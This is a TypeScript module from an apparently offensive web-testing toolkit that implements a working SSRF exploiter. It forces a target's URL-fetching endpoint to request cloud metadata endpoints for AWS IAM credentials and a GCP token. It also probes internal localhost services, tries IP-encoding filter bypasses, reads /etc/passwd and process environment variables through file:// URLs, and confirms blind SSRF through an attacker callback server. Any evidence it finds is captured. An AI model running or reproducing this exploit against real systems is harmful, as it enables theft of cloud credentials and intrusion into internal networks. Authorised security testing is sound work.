// SSRF exploiter / cloud metadata prober — TS port of app/modules/ssrf_probe.py
// (dropped ghostx-web project). `target` is the base URL of an endpoint that
// fetches a user-supplied URL server-side; params.param is the query
// parameter that carries the attacker-controlled URL; params.callback is an
// optional out-of-band URL for blind SSRF confirmation.
//
// Most invasive module in the set — it coaxes the target's own server into
// reaching internal/metadata endpoints on its behalf. Still governed by the
// same mandatory scope check as every other job, no separate exception.

import { JobContext, ModuleMeta, safeFetch, validateTargetUrl } from "./base";

export const meta: ModuleMeta = {
  id: "ssrf_probe",
  name: "SSRF Exploiter & Cloud Metadata Extractor",
  description: "Coaxes a URL-fetching endpoint into reaching internal/metadata targets.",
  riskTier: "active",
};

const METADATA_TARGETS: Array<[string, string]> = [
  ["http://169.254.169.254/latest/meta-data/", "AWS_metadata_root"],
  ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS_IAM_roles"],
  ["http://169.254.169.254/latest/meta-data/hostname", "AWS_hostname"],
  ["http://169.254.169.254/latest/user-data/", "AWS_userdata"],
  ["http://metadata.google.internal/computeMetadata/v1/", "GCP_metadata"],
  ["http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP_token"],
  ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure_metadata"],
  ["http://100.100.100.200/latest/meta-data/", "Alibaba_metadata"],
];

const INTERNAL_TARGETS = [
  "http://127.0.0.1/", "http://localhost/", "http://127.0.0.1:8080/",
  "http://127.0.0.1:3000/", "http://127.0.0.1:8443/", "http://127.0.0.1:9200/",
  "http://127.0.0.1:6379/", "http://127.0.0.1:27017/", "http://127.0.0.1:8500/",
  "http://127.0.0.1:8200/", "http://127.0.0.1:2375/", "http://127.0.0.1:10250/",
];

const BYPASS_TARGETS = [
  "http://0177.0.0.1/", "http://2130706433/", "http://0x7f000001/",
  "http://127.1/", "http://0.0.0.0/", "http://[::1]/", "http://[::]/",
  "http://127.0.0.1.nip.io/",
];

const PROTOCOL_TARGETS: Array<[string, string]> = [
  ["file:///etc/passwd", "file_etc_passwd"],
  ["file:///etc/hostname", "file_etc_hostname"],
  ["file:///proc/self/environ", "file_proc_environ"],
  ["dict://127.0.0.1:6379/info", "dict_redis"],
];

export async function* run(
  targetRaw: string,
  params: Record<string, string>,
  ctx: JobContext
): AsyncGenerator<string> {
  const baseUrl = validateTargetUrl(targetRaw);
  const param = (params.param ?? "").trim();
  const callback = (params.callback ?? "").trim();
  if (!param) {
    yield "[ERR] params.param (the query param that carries the fetched URL) is required";
    return;
  }

  yield "=== GHOST SSRF EXPLOITER ===";
  yield `Target: ${baseUrl}`;
  yield `Parameter: ${param}`;
  yield "============================";

  const findings: Array<Record<string, unknown>> = [];

  async function probe(innerUrl: string, label: string): Promise<string[]> {
    const url = `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}${encodeURIComponent(param)}=${encodeURIComponent(innerUrl)}`;
    const resp = await safeFetch(url, ctx);
    if (!resp) return [`[ERR] ${label} -> request failed`];
    const body = await resp.text().catch(() => "");
    if (body.length > 20) {
      findings.push({ label, target: innerUrl, bytes: body.length, evidence: body.slice(0, 500) });
      return [`[VULN] ${label} -> ${body.length} bytes returned`, `  ${JSON.stringify(body.slice(0, 500))}`];
    }
    return [];
  }

  yield "";
  yield "[*] Step 1: Baseline - can the app fetch external URLs?";
  const baselineUrl = `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}${encodeURIComponent(param)}=${encodeURIComponent("https://httpbin.org/get")}`;
  const baselineResp = await safeFetch(baselineUrl, ctx);
  const baselineBody = baselineResp ? await baselineResp.text().catch(() => "") : "";
  if (baselineBody.length > 50) {
    yield `[OK] External fetch works (${baselineBody.length} bytes)`;
  } else {
    yield "[*] External fetch may be blocked. Testing internal targets...";
  }

  yield "";
  yield "[*] Step 2: Testing internal/metadata targets";
  for (const [url, label] of METADATA_TARGETS) {
    for (const line of await probe(url, label)) yield line;
  }

  yield "";
  yield "[*] Step 3: Testing localhost and internal services";
  for (const url of INTERNAL_TARGETS) {
    for (const line of await probe(url, `internal_${url}`)) yield line;
  }

  yield "";
  yield "[*] Step 4: IP encoding bypass attempts";
  for (const url of BYPASS_TARGETS) {
    for (const line of await probe(url, `bypass_${url}`)) yield line;
  }

  yield "";
  yield "[*] Step 5: Protocol handler tests";
  for (const [url, label] of PROTOCOL_TARGETS) {
    for (const line of await probe(url, label)) yield line;
  }

  if (callback) {
    yield "";
    yield `[*] Step 6: Blind SSRF via callback (${callback})`;
    await probe(`${callback}/ssrf_test`, "callback_test").catch(() => []);
    await probe(`${callback}/ssrf_dns`, "callback_dns").catch(() => []);
    yield "[OK] Requests sent. Check your callback server for DNS/HTTP interactions.";
  }

  ctx.result.findings = findings;
  yield "";
  yield "============================";
  yield findings.length > 0
    ? `[VULN] ${findings.length} SSRF finding(s) captured`
    : "[OK] No SSRF confirmed. Target may have URL validation/allowlisting.";
}
